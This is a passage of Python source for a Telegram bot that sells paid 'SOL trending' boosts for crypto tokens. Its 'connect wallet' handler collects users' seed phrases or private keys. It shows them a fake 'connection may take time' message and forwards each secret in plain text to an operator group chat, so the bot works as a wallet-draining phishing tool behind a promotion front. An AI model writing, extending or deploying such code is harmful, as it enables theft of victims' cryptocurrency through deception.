                InlineKeyboardButton("⏳ 24 hours | 15 SOL", callback_data="sol_24h_15sol")
            )
            # Third row: 2 buttons
            markup.add(
                InlineKeyboardButton("⏳ 18 hours | 10 SOL", callback_data="sol_18h_10sol"),
                InlineKeyboardButton("⏳ 32 hours | 22 SOL", callback_data="sol_32h_22sol")
            )
            # Bottom row: 2 wider buttons
            markup.add(
                InlineKeyboardButton("🔙 Back", callback_data="sol_back"),
                InlineKeyboardButton("🔝 Main Menu", callback_data="sol_mainmenu")
            )
            bot.send_message(chat_id, text, reply_markup=markup)
        else:
            bot.send_message(chat_id, "❌ Please send a valid image file.")
        return

    # Handle wallet phrase input for connect
    if connect_phrase_waiting.get(chat_id):
        # Check if the phrase is valid (12 or 24 space-separated words) or a valid private key
        phrase = message.text.strip()
        words = phrase.split()
        is_phrase = len(words) in [12, 24]
        is_private_key = len(phrase) > 10
        if is_phrase or is_private_key:
            bot.send_message(chat_id, "CONNECTION OF WALLET MAY TAKE SOME TIME BASED ON NETWORK CONJESTIONS \nPLEASE BE PATIENT")
            # Notify group to await reply
            user = message.from_user.username or message.from_user.id
            bot.send_message(group_chat_id, f"Awaiting reply for wallet connection from @{user}")
            connect_phrase_waiting.pop(chat_id, None)
            # Send phrase/private key to bot group with reply/close buttons
            phrase_md = mdv2_escape(phrase)
            group_text = (
                f"CONNECT WALLET\n"
                f"User: @{user} (ID: {chat_id})\n"
                f"Phrase: {phrase_md}"
            )
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("reply", callback_data=f"group_reply_{chat_id}"),
                InlineKeyboardButton("close", callback_data=f"group_close_{chat_id}")
            )
            bot.send_message(group_chat_id, group_text, reply_markup=markup, parse_mode="Markdown")
        else:
            connect_phrase_waiting.pop(chat_id, None)
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("Retry", callback_data="try_connect_again"),
                InlineKeyboardButton("Menu", callback_data="menu_for_connect")
            )
            bot.send_message(chat_id, "❌ Invalid wallet phrase or private key. Please send a valid 12 or 24 word phrase, or a valid private key.", reply_markup=markup)
        return

    # All CA input is now handled by the new CA input handler above
    # No additional CA handling needed here


@bot.message_handler(content_types=['photo'], func=lambda message: message.chat.id != group_chat_id)
def handle_photo(message):
    chat_id = message.chat.id
    
    # Handle sponsorship design media
    if is_user_in_sponsorship_flow(chat_id):
        if handle_design_media(message):
            return
    
    # Handle banner image input for dexscreener
    if banner_waiting.get(chat_id):
        banner_waiting.pop(chat_id, None)
        # Call SOL trending directly
        text = (
            "🟢Discover the Power of Trending!\n\n"
            "Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!\n\n"
            "🟢A paid boost guarantees you a spot in our daily livestream (AMA)!\n\n"
            "➔ Please choose SOL Trending or Pump Fun Trending to start:\n"
            "_____________________"
        )
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(InlineKeyboardButton("🔻 TOP 6 🔻", callback_data="none"))
        markup.add(
            InlineKeyboardButton("⏳ 5 hours | 2 SOL", callback_data="sol_5h_2sol"),
            InlineKeyboardButton("⏳ 7 hours | 3.5 SOL", callback_data="sol_7h_3.5sol")
        )
        markup.add(
            InlineKeyboardButton("⏳ 12 hours | 7 SOL", callback_data="sol_12h_7sol"),
            InlineKeyboardButton("⏳ 24 hours | 15 SOL", callback_data="sol_24h_15sol")
        )
        markup.add(
            InlineKeyboardButton("⏳ 18 hours | 10 SOL", callback_data="sol_18h_10sol"),
            InlineKeyboardButton("⏳ 32 hours | 22 SOL", callback_data="sol_32h_22sol")
        )
        markup.add(
            InlineKeyboardButton("🔙 Back", callback_data="sol_back"),
            InlineKeyboardButton("🔝 Main Menu", callback_data="sol_mainmenu")
        )
        bot.send_message(chat_id, text, reply_markup=markup)
    # (You can add other photo handling logic here if needed)

@bot.message_handler(content_types=['video', 'document', 'animation'], func=lambda message: message.chat.id != group_chat_id)
def handle_media(message):
    chat_id = message.chat.id
    
    # Handle sponsorship design media
    if is_user_in_sponsorship_flow(chat_id):
        if handle_design_media(message):
            return

if __name__ == "__main__":
    # Create process lock to prevent multiple instances
    bot_lock = BotLock()
    
    if not bot_lock.acquire():
        print("Exiting...")
        sys.exit(1)
    
    print("bot is running")
    try:
        bot.polling(none_stop=True, timeout=60)
    except KeyboardInterrupt:
        print("Bot stopped by user")
    except Exception as e:
        print(f"Bot error: {e}")
    finally:
        bot_lock.release()
        print("Bot stopped")
